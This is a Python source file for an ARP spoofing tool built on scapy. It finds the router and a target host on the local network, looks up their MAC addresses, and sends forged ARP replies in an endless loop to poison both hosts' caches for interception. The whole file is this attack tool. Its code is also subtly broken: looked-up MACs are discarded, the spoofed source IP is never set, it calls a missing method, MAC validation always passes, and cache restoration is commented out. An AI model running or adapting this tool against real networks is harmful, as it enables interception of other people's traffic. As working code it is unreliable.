import subprocess
import os
import re
import colors
import sys
import time
import scapy.all as scapy
from io import StringIO


class ARPSpoof(object):

    def __init__(self, ip=None):

        self.target_ip = None
        self.router_ip = None
        self.my_ip = None
        self.target_mac = None
        self.router_mac = None
        self.no_of_packets = 0
        self.INTER = 1

        self.is_root()

        if ip is not None:
            self.target_ip = ip
        else:
            self.get_target_IP()

        if self.router_ip is None:
            self.get_router_IP()

        if self.target_mac is None:
            self.getMAC(self.target_ip, 'TARGET')

        if self.router_mac is None:
            self.getMAC(self.router_ip, 'ROUTER')

    @staticmethod
    def is_root():
        """
        Checks if program is running as root or not
        """

        if os.geteuid() != 0:
            colors.error('Please run as root')
            sys.exit(1)
        else:
            colors.success('Running as root')

    def validateIP(self, ip: str):
        """
        Check whether the input IP is valid or not
        """
        if re.match(r'^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])'
                    '(\.(?!$)|$)){4}$', ip):
            return True

    def validateMAC(self, mac):
        return True

    def get_router_IP(self):
        """
        Finds the router IP address
        """

        colors.info('Finding Router IP address...')

        command_process = subprocess.Popen(['route', '-n'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = command_process.communicate()

        if error:
            print(error.decode('utf-8'))

        output = output.decode('utf-8')
        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", output)

        colors.success('Router IP found is : {}'.format(ip_candidates[1]))
        val = str(input('Continue with this IP address(Y) or enter a different IP address : ')).strip()
        if val == 'Y' or val == 'y':
            self.router_ip = ip_candidates[1]
            colors.info('Router IP set to : {}'.format(self.router_ip))
        elif self.validateIP(val):
            self.router_ip = val
            colors.info('Router IP set to : {}'.format(self.router_ip))
        else:
            colors.error('Please enter a valid Router IP address')
            self.findRouterIP()

    def get_target_IP(self):
        """
        Fetches target IP to spoof
        """

        if self.target_ip is None:
            print('[-] No target IP selected, please enter an IP address or run network scan (Enter "S") : ')
            value = str(input()).strip()
            if value == 'S' or value == 's':
                self.networkScan()
            elif self.validateIP(value):
                colors.info('Selected target IP is : {}'.format(value))
                self.target_ip = value
            else:
                colors.error('Please enter a valid IP address to continue...')
                self.get_target_IP()

    def capture_output(self, to_perform):
        capture = StringIO()
        temp_stdout = sys.stdout
        sys.stdout = capture
        to_perform.show()
        sys.stdout = temp_stdout
        return capture.getvalue()

    def getMAC(self, IP, name):
        """
        Fetches MAC address of the selected IP
        """

        arp_packet = scapy.ARP(pdst=IP)
        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_broadcast = broadcast/arp_packet
        broadcast = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
        mac_addr_str = self.capture_output(broadcast)
        mac_addr = re.findall(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', mac_addr_str)[0]
        mac_addr = str(mac_addr).strip()

        colors.success('Found MAC address for {} : {} is : {}'.format(name, IP, mac_addr))
        val = str(input('>> Enter Y to continue or enter MAC address : ')).strip()
        if val == 'Y' or val == 'y':
            return mac_addr
        elif self.validateMAC(val):
            colors.info('Setting MAC address for {} : {} : {}'.format(name, IP, val))
            return val
        else:
            colors.error('Please enter a valid MAC address...')
            self.getMAC(IP, name)

    def networkScan(self):

        print('Enter the IP address to start scanning...')
        ip = str(input()).strip()
        if self.validateIP(ip):
            try:
                colors.info('Initiating ARP Scan')

                from lib.scanner.ip_scanner import arp_scanner

                arpScanObj = arp_scanner.ARPScan(ip=ip,
                                                 start_ip=None,
                                                 end_ip=None,
                                                 threads=100)
                total_index, result_dict = arpScanObj.threadingScan()

                index = int(input('>> Enter the index of the target IP : '))
                if index < total_index and index > 0:
                    self.target_ip = result_dict[index][0]
                    self.target_mac = result_dict[index][1]

                    colors.success('Target IP set to : {}'.format(self.target_ip))
                    colors.success('Target MAC set to : {}'.format(self.target_mac))

            except ImportError:
                colors.error('Could not import the required module.')
            except Exception as e:
                print(e)
        else:
            colors.error('Please enter a valid IP address...')
            self.networkScan()

    def generatePacket(self):
        target_arp_packet = scapy.ARP(op=2, hwdst=self.target_mac,
                                      pdst=self.target_ip, psrc=self.my_ip)
        router_arp_packet = scapy.ARP(op=2, hwdst=self.router_mac,
                                      pdst=self.router_ip, psrc=self.my_ip)

        return target_arp_packet, router_arp_packet

    def startSpoof(self):

        t1 = time.time()

        colors.info('ARP Spoofing started...')
        colors.info('Press CTRL+C to exit...')

        try:
            while True:
                target_arp_packet, router_arp_packet = self.generatePacket()
                scapy.send(target_arp_packet, verbose=False)
                scapy.send(router_arp_packet, verbose=False)
                self.no_of_packets = self.no_of_packets + 1
                print('[+] Packets sent : {}'.format(self.no_of_packets), end='\r')
                time.sleep(self.INTER)

        except KeyboardInterrupt:
            colors.info('Stopping ARP spoof')

        except Exception as e:
            print(e)

        finally:
#            self.restore()
            t2 = time.time()
            colors.success('ARP Spoof completed in : {}'.format(t2-t1))
